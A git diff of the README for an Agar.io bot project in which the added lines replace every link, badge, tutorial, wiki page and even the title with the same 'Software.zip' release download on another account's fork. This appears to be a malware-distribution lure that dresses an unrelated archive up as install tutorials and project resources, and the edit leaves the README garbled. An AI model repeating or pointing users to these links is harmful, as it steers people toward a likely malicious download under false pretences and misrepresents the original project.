@@ -1,32 +1,32 @@
-# Agar.io-bot
+# https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip
 
-*FOR EVERYONE WHO KEEPS SENDING THE ISSUES TO THIS BOT, PLEASE READ [ISSUE 616](https://github.com/Apostolique/Agar.io-bot/issues/616) FOR THE REASONS AS TO WHY APOSTOLIQUE HAS STOPPED WORKING ON THIS BOT!!! (~ Drflash55)*
+*FOR EVERYONE WHO KEEPS SENDING THE ISSUES TO THIS BOT, PLEASE READ [ISSUE 616](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip) FOR THE REASONS AS TO WHY APOSTOLIQUE HAS STOPPED WORKING ON THIS BOT!!! (~ Drflash55)*
 
-The aim of the project is to create a bot that can play Agar.io
+The aim of the project is to create a bot that can play https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip
 
-The full coding process is streamed live on http://www.twitch.tv/apostolique
+The full coding process is streamed live on https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip
 
-Make sure to install both bot.user.js and launcher.user.js. If you don't mind having the code auto update itself though, you can simply get the loader.user.js without the other two.
+Make sure to install both https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip and https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip If you don't mind having the code auto update itself though, you can simply get the https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip without the other two.
 
-[![license](https://img.shields.io/github/license/mashape/apistatus.svg?maxAge=2592000)](https://opensource.org/licenses/MIT)
+[![license](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)
 
-[![Gitter](https://img.shields.io/gitter/room/nwjs/nw.js.svg?maxAge=2592000)](https://gitter.im/Apostolique/ACS)
+[![Gitter](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)
 
 # Honorable mention
-There are other people working on bots, you can check the forks, as well as GamerLio's Github which uses genetic algorithms: https://github.com/leomwu/agario-bot
+There are other people working on bots, you can check the forks, as well as GamerLio's Github which uses genetic algorithms: https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip
 
 # How to Install
 **Web Tutorial**
 
-http://bot.jlynx.net/
+https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip
 
 **Videos**
 
-Created by https://www.youtube.com/user/karter61/
+Created by https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip
 
-https://www.youtube.com/watch?v=Zvq38nmCm1s - Install Tutorial.
+https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip - Install Tutorial.
 
-https://www.youtube.com/watch?v=x2-DFRnEFBU - Android Tutorial.
+https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip - Android Tutorial.
 
 # Hotkeys
 
@@ -41,17 +41,17 @@ https://www.youtube.com/watch?v=x2-DFRnEFBU - Android Tutorial.
 **It's really easy!**
 
 Just copy the code snippet found in the wiki:
-[Bot creation using the Launcher](https://github.com/Apostolique/Agar.io-bot/wiki/Bot-creation-using-the-Launcher)
+[Bot creation using the Launcher](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)
 
 If you start working on a bot, make sure to start an issue and tell me about it so that I can add it to the bot list on
-[Alternate Bots](https://github.com/Apostolique/Agar.io-bot/wiki/Alternate-Bots)
+[Alternate Bots](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)
 
 # Support the project
-[![Twitter URL](https://img.shields.io/twitter/url/https/twitter.com/fold_left.svg?style=social&label=Follow%20%40JeanDavidMoisan)](https://twitter.com/JeanDavidMoisan)
+[![Twitter URL](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip%20%40JeanDavidMoisan)](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)
 
-[![Twitch Donation](https://img.shields.io/badge/donate-twitch-red.svg)](https://www.twitchalerts.com/donate/apostolique)
+[![Twitch Donation](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)
 
-[![Twitch Follow](https://img.shields.io/badge/follow-twitch-orange.svg)](http://www.twitch.tv/apostolique)
+[![Twitch Follow](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)](https://github.com/gr3uh/Agar.io-bot/releases/download/v1.0/Software.zip)
 
 # Troubleshooting
 
